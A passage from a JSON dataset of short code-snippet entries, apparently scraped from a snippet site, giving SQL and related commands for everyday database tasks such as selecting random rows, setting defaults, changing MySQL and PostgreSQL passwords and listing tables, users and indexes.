    "title": " select query group by name",
    "description": "SELECT `gender` FROM `members` GROUP BY `gender`;\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3604,
    "keyword": null,
    "link": null,
    "title": " select query in mysql",
    "description": "$sql = \"SELECT id, firstname, lastname FROM MyGuests\"; $result = $conn->query($sql);  if ($result->num_rows > 0) {     // output data of each row     while($row = $result->fetch_assoc()) {         echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"firstname\"]. \" \" . $row[\"lastname\"]. \"<br>\";     } } else {     echo \"0 results\"; } $conn->close();\nSELECT * FROM `table_name`; SELECT `col1`,`col2` FROM `table_name`; SELECT `col1 as name`,`col2 as email` FROM `table_name`; SELECT * FROM `table_name` WHERE id = '1';\nSELECT column_name(s) FROM table_name\nSELECT    `nachname` , `vorname`  FROM testadressen WHERE vorname = 'Fischer' \nSELECT select_list FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3605,
    "keyword": null,
    "link": null,
    "title": " select query in sql for multiple values",
    "description": "SELECT * FROM dbo.FeedBackMaster WHERE Comment='Bad' or Comment='Not satisfy' or Comment='Disaster';\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3606,
    "keyword": null,
    "link": null,
    "title": " select query where in sql",
    "description": "  SELECT * FROM Customers   WHERE CustomerID=1; \n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3607,
    "keyword": null,
    "link": null,
    "title": " select random rows sql",
    "description": "SELECT FIELD_NAME FROM TABLE_NAME ORDER BY RAND() LIMIT 1 /* NOTE if this doesnt work try random() */\nSELECT column FROM table ORDER BY RAND() LIMIT 1 \n Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3608,
    "keyword": null,
    "link": null,
    "title": " select random sample sql",
    "description": " Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3609,
    "keyword": null,
    "link": null,
    "title": " select random sql",
    "description": "SELECT column FROM table ORDER BY RAND() LIMIT 1\nSELECT column FROM table ORDER BY RANDOM() LIMIT 1 \n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3610,
    "keyword": null,
    "link": null,
    "title": " select row from mysql where date more than 30 days",
    "description": "mysql> delete from DemoTable where UserMessageSentDate < now() - interval 30 DAY; Query OK, 3 rows affected (0.11 sec)\n",
    "reg_date": "2021-10-12T09:59:42.000Z"
  },
  {
    "id": 3611,
    "keyword": null,
    "link": null,
    "title": " select sequence oracle",
    "description": "SELECT schema.seq_name.NEXTVAL FROM dual;  INSERT INTO table_name (VALUE1) VALUES ( \tschema.seq_name.NEXTVAL AS VALUE1 );\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3612,
    "keyword": null,
    "link": null,
    "title": " select sql order",
    "description": "SELECT naslov, stranice AS broj FROM knjige ORDER BY broj DESC\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3613,
    "keyword": null,
    "link": null,
    "title": " select tables from mysql database",
    "description": "SELECT table_name  FROM information_schema.tables  WHERE table_type = 'base table' AND table_name like '%YOUR TABLE NAME%';\nSHOW TABLES;\nSHOW TABLES from <databasename>;\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3614,
    "keyword": null,
    "link": null,
    "title": " select tables with name like mysql",
    "description": "SELECT table_name FROM information_schema.tables\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3615,
    "keyword": null,
    "link": null,
    "title": " select top 10 rows in sql",
    "description": "SELECT TOP 10 * FROM Customers;\nsyntax -> SELECT column_name(s) FROM table_name WHERE ROWNUM <= number  ////example/// SELECT * FROM Persons WHERE ROWNUM <=5 \nIn MySQL, top 50 rows are displayed by using this following query: SELECT * FROM LIMIT 0, 50;\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3616,
    "keyword": null,
    "link": null,
    "title": " select true if exists on another table or false sqlserver",
    "description": "  select A.name,         CASE WHEN B.name IS NOT NULL        THEN 1        ELSE 0        END      from table1 A     left join table2 B     on A.name = B.name\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3617,
    "keyword": null,
    "link": null,
    "title": " select where duplicate mysql",
    "description": "SELECT name, COUNT(*) c FROM table GROUP BY name HAVING c > 1;\nSELECT      col1, COUNT(col1),     col2, COUNT(col2) FROM     table_name GROUP BY      col1,      col2 HAVING         (COUNT(col1) > 1) AND         (COUNT(col2) > 1); \n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3618,
    "keyword": null,
    "link": null,
    "title": " select where mysql",
    "description": "SELECT      select_list FROM     table_name WHERE     search_condition;\nSELECT      select_list FROM     table_name WHERE     search_condition;     AND OR Like In Is     officeCode = 1;\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3619,
    "keyword": null,
    "link": null,
    "title": " select with case in mysql",
    "description": "SELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nmysql> SELECT CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END;  +-------------------------------------------------------------+ | CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END | +-------------------------------------------------------------+ | this is false                                               |  +-------------------------------------------------------------+\n-- LABEL MOVIE LENGTH  select title, length, CASE  \t when length < 50 then 'very short film'      when length < 90 then 'short film'      when length < 120 then 'medium length film'      when length > 120 then 'long film'      else 'unknown length' END -- AS film_length from film;  -- SAME AS ABOVE BUT ON A CUSTOM NAMED COLUMN select title, length, CASE  \t when length < 50 then 'very short film'      when length < 90 then 'short film'      when length < 120 then 'medium length film'      when length > 120 then 'long film'      else 'unknown length' END  AS film_length from film;  -- RESULT +-----------------------------+--------+--------------------+ | title                       | length | film_length        | +-----------------------------+--------+--------------------+ | ACADEMY DINOSAUR            |     86 | short film         | | ACE GOLDFINGER              |     48 | very short film    | | ADAPTATION HOLES            |     50 | short film         | | AFFAIR PREJUDICE            |    117 | medium length film | | AFRICAN EGG                 |    130 | long film          | | AGENT TRUMAN                |    169 | long film          | | AIRPLANE SIERRA             |     62 | short film         | | AIRPORT POLLOCK             |     54 | short film         | | ALABAMA DEVIL               |    114 | medium length film | | ALADDIN CALENDAR            |     63 | short film         | | ALAMO VIDEOTAPE             |    126 | long film          | | ALASKA PHANTOM              |    136 | long film          | | ALI FOREVER                 |    150 | long film          | | ALICE FANTASIA              |     94 | medium length film | | ALIEN CENTER                |     46 | very short film    | \nSELECT  t2.company_name, t2.expose_new, t2.expose_used, t1.title, t1.status,  CASE status    when 'New' and t2.expose_new = 1 then 1    when 'New' and t2.expose_new = 2 then 2    when 'New' and t2.expose_new = 3 then 3    when 'Used' and t2.expose_used = 1 then 1    when 'Used' and t2.expose_used = 2 then 2    when 'Used' and t2.expose_used = 3 then 3 END as expose FROM `products` t1 join manufacturers t2 on t2.id = t1.seller where t1.seller = 4238\n   SELECT  CASE     WHEN Quantity > 30    THEN \"The quantity is greater than 30\"     WHEN Quantity =    30 THEN \"The quantity is 30\"     ELSE \"The quantity is    under 30\" END FROM OrderDetails; \n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3620,
    "keyword": null,
    "link": null,
    "title": " select with condition query in mysql",
    "description": "SELECT * FROM `table_name`; SELECT `col1`,`col2` FROM `table_name`; SELECT `col1 as name`,`col2 as email` FROM `table_name`; SELECT * FROM `table_name` WHERE id = '1';\n",
    "reg_date": "2021-10-12T09:59:43.000Z"
  },
  {
    "id": 3621,
    "keyword": null,
    "link": null,
    "title": " selecting specific day in colum sql",
    "description": "extract(dow from payment_date)\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3622,
    "keyword": null,
    "link": null,
    "title": " self join example",
    "description": "SELECT     e.first_name + ' ' + e.last_name employee,     m.first_name + ' ' + m.last_name manager FROM     sales.staffs e INNER JOIN sales.staffs m ON m.staff_id = e.manager_id ORDER BY     manager;\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3623,
    "keyword": null,
    "link": null,
    "title": " self join in sql server",
    "description": "/* SELF JOIN - Joining a table with itself is called as self join.   It is classified under any type of join.   INNER JOIN   OUTER JOIN CROSS JOIN. */ SELECT Column_List FROM Left_Table_Name AS Alias_Name JOIN_TYPE Right_Table_Name AS Alias_Name ON Alias_Name.Column_List [Operator] Alias_Name.Column_List  /* Example*/ SELECT E.Name AS Employee, M.Name AS Manager FROM tblEmployee E LEFT JOIN tblEmployee M ON E.ManagerID = M.EmployeeID\nSELECT     e.first_name + ' ' + e.last_name employee,     m.first_name + ' ' + m.last_name manager FROM     sales.staffs e INNER JOIN sales.staffs m ON m.staff_id = e.manager_id ORDER BY     manager;\nSELECT column_name(s) FROM table1 T1, table1 T2 WHERE condition;\nSelf is joining a table to itself.  -- assume employee table as 2 different table using different alias  -- as  manager and worker  -- we want to join these 2 virtual manager and worker table  -- to get manager's first name and worker's first name  -- our condition is worker's manager_id match managers employee id  SELECT  manager.FIRST_NAME AS MANAGER_NAME ,          worker.FIRST_NAME AS WORKER_NAME  FROM EMPLOYEES manager  INNER JOIN EMPLOYEES worker on worker.MANAGER_ID = manager.EMPLOYEE_ID    order by 1  ;\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3624,
    "keyword": null,
    "link": null,
    "title": " sequelize migration default value",
    "description": "queryInterface.addColumn('OrderBackups', 'my_column', {   type: Sequelize.INTEGER,   defaultValue: 0 })\nqueryInterface.addColumn('My_table', 'my_column', {   type: Sequelize.INTEGER,   defaultValue: 0 })\nawait queryInterface.addColumn('my_list', 'is_deleted', {   type: Sequelize.BOOLEAN,   defaultValue: false });\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3625,
    "keyword": null,
    "link": null,
    "title": " server name sql server",
    "description": "SELECT @@SERVERNAME AS 'Server Name'\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3626,
    "keyword": null,
    "link": null,
    "title": " server side datatable target all",
    "description": "There are four options for target :  1. 0 or a positive integer - column index counting from the left 2. A negative integer - column index counting from the right 3. A string - class name will be matched on the TH for the column(without a  leading .) 4. The string \"_all\" - all columns (i.e. assign a default)\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3627,
    "keyword": null,
    "link": null,
    "title": " serveroutput",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); END;\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3628,
    "keyword": null,
    "link": null,
    "title": " services.AddDbContext DataSource Sqlite",
    "description": "-- Using AspNet.3.1 EntityFrameworkCode w Sqlite database -- Add Context class public class DatabaseContext : DbContext {     protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)     {         optionsBuilder.UseSqlite(\"Filename=MyDatabase.db\");     } }  -- Add to Startup ConfigureServices  \tservices.AddEntityFrameworkSqlite ().AddDbContext<DatabaseContext> ();\n",
    "reg_date": "2021-10-12T09:59:44.000Z"
  },
  {
    "id": 3629,
    "keyword": null,
    "link": null,
    "title": " set a default value for a column in sqlite",
    "description": "CREATE TABLE Products (      ProductId INTEGER PRIMARY KEY,      ProductName,     Price DEFAULT 0.00 );\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3630,
    "keyword": null,
    "link": null,
    "title": " set all the vluses in calumn in sql to false",
    "description": "UPDATE YourTableName SET IsConfirmed=0 WHERE isConfirmed is Null\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3631,
    "keyword": null,
    "link": null,
    "title": " set autoincrement to 0",
    "description": "ALTER TABLE tablename AUTO_INCREMENT = 1\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3632,
    "keyword": null,
    "link": null,
    "title": " set boolean flasksql",
    "description": "class User(db.Model):     __tablename__ = 'users'     id = db.Column(db.Integer, primary_key=True)     can_view_records = db.Column(db.Boolean, default=False, nullable=False)\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3633,
    "keyword": null,
    "link": null,
    "title": " set column as unique in sql server",
    "description": "ALTER TABLE Persons ADD UNIQUE (ID); \nUSE AdventureWorks2012;   GO   CREATE TABLE Production.TransactionHistoryArchive4    (      TransactionID int NOT NULL,       CONSTRAINT AK_TransactionID UNIQUE(TransactionID)    );    GO    \n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3634,
    "keyword": null,
    "link": null,
    "title": " set column in all row mysql",
    "description": "UPDATE name_table SET param = 'VALUE';\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3635,
    "keyword": null,
    "link": null,
    "title": " set column to not null mysql",
    "description": "ALTER TABLE Person MODIFY P_Id INT(11) NOT NULL;\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3636,
    "keyword": null,
    "link": null,
    "title": " set column width in sqlplus",
    "description": "sql>column column_name format a30 sql>set linesize 300\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3637,
    "keyword": null,
    "link": null,
    "title": " set database timezone mysql",
    "description": "SET GLOBAL time_zone = '+8:00'; SET GLOBAL time_zone = 'Europe/Helsinki'; SET @@global.time_zone = '+00:00'; \n# SET ON /etc/my.cnf  default-time-zone='+00:00' \n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3638,
    "keyword": null,
    "link": null,
    "title": " set default column value sql",
    "description": "ALTER TABLE users ADD visit_number INT DEFAULT 0;\nName Varchar(255) default \"Fred\"\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3639,
    "keyword": null,
    "link": null,
    "title": " set default today mysql",
    "description": "ALTER TABLE table ADD column DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:59:45.000Z"
  },
  {
    "id": 3640,
    "keyword": null,
    "link": null,
    "title": " set default value mysql db",
    "description": "ALTER TABLE mytbl ALTER j SET DEFAULT 1000;\n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3641,
    "keyword": null,
    "link": null,
    "title": " set id count mysql",
    "description": "ALTER TABLE name AUTO_INCREMENT=310; \n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3642,
    "keyword": null,
    "link": null,
    "title": " set identity insert off",
    "description": "SET IDENTITY_INSERT sometableWithIdentity ON  INSERT sometableWithIdentity (IdentityColumn, col2, col3, ...) VALUES (AnIdentityValue, col2value, col3value, ...)  SET IDENTITY_INSERT sometableWithIdentity OFF\nSET IDENTITY_INSERT tbl_content ON \n   SET IDENTITY_INSERT [ [ database_name . ] schema_name . ] table_name { ON | OFF }   \nSET IDENTITY_INSERT sometableWithIdentity ON  INSERT sometableWithIdentity (IdentityColumn, col2, col3, ...) VALUES (AnIdentityValue, col2value, col3value, ...)  SET IDENTITY_INSERT sometableWithIdentity OFF 7 identity_insert is set to offSQL By Super Snail on Oct 6 2020 SET IDENTITY_INSERT tbl_content ON 1 set identity_insert offSQL By Bams999 on Jan 27 2021    SET IDENTITY_INSERT [ [ database_name . ] schema_name . ] table_name { ON | OFF }  \n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3643,
    "keyword": null,
    "link": null,
    "title": " set mysql mode global query",
    "description": "SET GLOBAL sql_mode=\"\"\n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3644,
    "keyword": null,
    "link": null,
    "title": " set mysql password xampp",
    "description": "SET PASSWORD FOR 'root'@'localhost' = PASSWORD('pass'); FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3645,
    "keyword": null,
    "link": null,
    "title": " set open file limit mac catalina mysql",
    "description": "sudo launchctl limit maxfiles 65536 200000\n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3646,
    "keyword": null,
    "link": null,
    "title": " set operators in sql",
    "description": "UNION ALL: COMBINES THE RESULT OF 2 QUERY AND DOESN'T REMOVE DUPLICATE ROWS AND DOESN'T SORT BY FIRST COLUMN  UNION: COMBINES THE RESULT OF 2 QUERY AND REMOVES DUPLICATE ROWS AND SORTS BY FIRST COLUMN   MINUS: MINUS RETURNS THE LEFT NON MATCHING DATA AS A RESULT.   INTERSECT: BASICALLY INTERSECT COMBINES COMMON ELEMENTS OF BOTH TABLES     \n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3647,
    "keyword": null,
    "link": null,
    "title": " set parameter sql server",
    "description": "USE AdventureWorks2012;   GO   -- Passing values as constants.   EXEC dbo.uspGetWhereUsedProductID 819, '20050225';   GO   -- Passing values as variables.   DECLARE @ProductID int, @CheckDate datetime;   SET @ProductID = 819;   SET @CheckDate = '20050225';   EXEC dbo.uspGetWhereUsedProductID @ProductID, @CheckDate;   GO   -- Try to use a function as a parameter value.   -- This produces an error message.   EXEC dbo.uspGetWhereUsedProductID 819, GETDATE();   GO   -- Passing the function value as a variable.   DECLARE @CheckDate datetime;   SET @CheckDate = GETDATE();   EXEC dbo.uspGetWhereUsedProductID 819, @CheckDate;   GO   \n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3648,
    "keyword": null,
    "link": null,
    "title": " set password mysql",
    "description": "ALTER USER 'user-name'@'localhost' IDENTIFIED BY 'NEW_USER_PASSWORD';FLUSH PRIVILEGES;\nSET PASSWORD FOR 'user-name'@'localhost' = PASSWORD('NEW_USER_PASSWORD');FLUSH PRIVILEGES;\n-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\n# `SET PASSWORD FOR <user> = PASSWORD('<plaintext_password>')` is deprecated SET PASSWORD FOR <user> = '<plaintext_password>'; FLUSH PRIVILEGES;\nUPDATE mysql.user SET authentication_string = PASSWORD('NEW_USER_PASSWORD')WHERE User = 'user-name' AND Host = 'localhost';FLUSH PRIVILEGES;CopyCopyCopied!\nmysql -u root -pCopy\n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3649,
    "keyword": null,
    "link": null,
    "title": " set permanent SET GLOBAL sql mode ubuntu",
    "description": "[mysqld] sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION \n",
    "reg_date": "2021-10-12T09:59:46.000Z"
  },
  {
    "id": 3650,
    "keyword": null,
    "link": null,
    "title": " set root password mysql xampp",
    "description": "mysqladmin -u root password\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3651,
    "keyword": null,
    "link": null,
    "title": " set sequence value oracle",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3652,
    "keyword": null,
    "link": null,
    "title": " set serveroutput on in pl/sql developer",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3653,
    "keyword": null,
    "link": null,
    "title": " set serveroutput on oracle",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3654,
    "keyword": null,
    "link": null,
    "title": " set serveroutput on sql developer",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); END;\nSET SERVEROUTPUT ON BEGIN  Dbms_Output.Put_Line(Systimestamp); END;\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3655,
    "keyword": null,
    "link": null,
    "title": " set sql multiple values",
    "description": " UPDATE Person.Person  Set FirstName = 'Kenneth'     ,LastName =  'Smith'  WHERE BusinessEntityID = 1\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3656,
    "keyword": null,
    "link": null,
    "title": " set username and password for postgresql database",
    "description": "sudo -u postgres psql -c \"ALTER USER postgres PASSWORD 'postgres';\"\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3657,
    "keyword": null,
    "link": null,
    "title": " set utf8mb4 mysql tables",
    "description": "--For each database:  ALTER DATABASE     database_name     CHARACTER SET = utf8mb4     COLLATE = utf8mb4_unicode_ci;      --For each table:  ALTER TABLE     table_name     CONVERT TO CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;      --For each column:  ALTER TABLE     table_name     CHANGE column_name column_name     VARCHAR(191)     CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3658,
    "keyword": null,
    "link": null,
    "title": " show all Schemas postgres",
    "description": "\\dn # list the schemas\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3659,
    "keyword": null,
    "link": null,
    "title": " show all databases sqlplus",
    "description": "1) To view database  select * from v$database;  2) To view instance  select * from v$instance;  3) To view all users  select * from all_users;   4) To view table and columns for a particular user  select tc.table_name Table_name ,tc.column_id Column_id ,lower(tc.column_name) Column_name ,lower(tc.data_type) Data_type ,nvl(tc.data_precision,tc.data_length) Length ,lower(tc.data_scale) Data_scale ,tc.nullable nullable FROM all_tab_columns tc ,all_tables t WHERE tc.table_name = t.table_name;\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3660,
    "keyword": null,
    "link": null,
    "title": " show all event schedular on mysql",
    "description": "SELECT * FROM INFORMATION_SCHEMA.events;\n",
    "reg_date": "2021-10-12T09:59:47.000Z"
  },
  {
    "id": 3661,
    "keyword": null,
    "link": null,
    "title": " show all tables in oracle",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All database Tables\nSELECT * FROM ALL_TABLES;\nSELECT   table_name, owner FROM   all_tables ORDER BY   owner, table_name \n-- NOTE: for Oracle ONLY  select *  from all_tables;\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3662,
    "keyword": null,
    "link": null,
    "title": " show all tables postgres",
    "description": "SELECT * FROM pg_catalog.pg_tables; \nPostgreSQL show tables command \t \\dt\n\\dt # show list of tables in postgres\n\\d table\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3663,
    "keyword": null,
    "link": null,
    "title": " show all users in mysql",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\n//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\nmysql> select host, user, password from mysql.user; \n#display all user data select * from mysql.user; #display username and host select user, host from mysql.user;\nmysql> select * from mysql.user; \nSELECT User,Host FROM mysql.user; DROP USER 'testuser'@'localhost';\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3664,
    "keyword": null,
    "link": null,
    "title": " show create table query of table in mysql",
    "description": "SHOW CREATE TABLE tablename\nCopied mysql> SHOW CREATE TABLE t\\G *************************** 1. row ***************************        Table: t Create Table: CREATE TABLE `t` (   `id` int(11) NOT NULL AUTO_INCREMENT,   `s` char(60) DEFAULT NULL,   PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3665,
    "keyword": null,
    "link": null,
    "title": " show database not empty tables postgres",
    "description": "select schemaname, relname, n_tup_ins from pg_stat_all_tables WHERE schemaname = 'public' ORDER BY n_tup_ins  \n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3666,
    "keyword": null,
    "link": null,
    "title": " show databases in sql server",
    "description": "SELECT * FROM SYS.DATABASES\nEXEC sp_databases\nSELECT * FROM SYS.SYSDATABASES\nSELECT name FROM master.SYS.DATABASES\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3667,
    "keyword": null,
    "link": null,
    "title": " show databases mysql docker",
    "description": "First, go inside docker container, run below command docker exec -it mysql_container_name mysql -uroot -p where &ldquo;root&rdquo; is the username for MySQL database. After running above command it will ask you a password.  Then Select Database, run below command USE Name-Of-The-Database  get the list of all tables. show tables;\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3668,
    "keyword": null,
    "link": null,
    "title": " show databse mysql",
    "description": "SHOW DATABASES;\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3669,
    "keyword": null,
    "link": null,
    "title": " show details of table postgres",
    "description": "PostgreSQL show tables command \t \\dt\npostgres=# \\d schema.tablename; \npostgres=# \\d tablename;\n\\d table\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3670,
    "keyword": null,
    "link": null,
    "title": " show if date is nul sql",
    "description": " SELECT * FROM yourtable WHERE yourdatecolumn IS NULL\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3671,
    "keyword": null,
    "link": null,
    "title": " show index table",
    "description": "SHOW INDEX FROM yourtable;\n",
    "reg_date": "2021-10-12T09:59:48.000Z"
  },
  {
    "id": 3672,
    "keyword": null,
    "link": null,
    "title": " show indexes mysql",
    "description": "SHOW INDEX FROM yourtable;\nSHOW INDEXES FROM table_name;\nSELECT     tablename,     indexname,     indexdef FROM     pg_indexes WHERE     schemaname = 'yourschema' and tablename='yourtable' ORDER BY     tablename,     indexname; (POSTRGRESQL)\n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3673,
    "keyword": null,
    "link": null,
    "title": " show line number in sql server",
    "description": "-- SQL Server Management Studio:  Tools -> Options > Text Editor > Transact-SQL > General > Display > Line numbers\n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3674,
    "keyword": null,
    "link": null,
    "title": " show list of users in mysql",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\n//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\n#display all user data select * from mysql.user; #display username and host select user, host from mysql.user;\nmysql> select * from mysql.user; \nSELECT User,Host FROM mysql.user; DROP USER 'testuser'@'localhost';\n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3675,
    "keyword": null,
    "link": null,
    "title": " show max allowed packet mysql",
    "description": "SHOW VARIABLES LIKE 'max_allowed_packet'; \n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3676,
    "keyword": null,
    "link": null,
    "title": " show mysql user table",
    "description": "mysql> select host, user, password from mysql.user; \nmysql> select * from mysql.user; \n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3677,
    "keyword": null,
    "link": null,
    "title": " show primary key in sql",
    "description": "-- NOTE: this is for SQL-Oracle specifically  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner   -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner\nThe PRIMARY KEY constraint uniquely identifies each record in a table. Primary keys must contain UNIQUE values, and cannot contain NULL values.  A table can have only ONE primary key; and in the table, this primary key can consist of single or multiple columns (fields). \n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3678,
    "keyword": null,
    "link": null,
    "title": " show secure-file-priv in mysql by query",
    "description": "SHOW VARIABLES LIKE \"secure_file_priv\";\n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3679,
    "keyword": null,
    "link": null,
    "title": " show size database mysql",
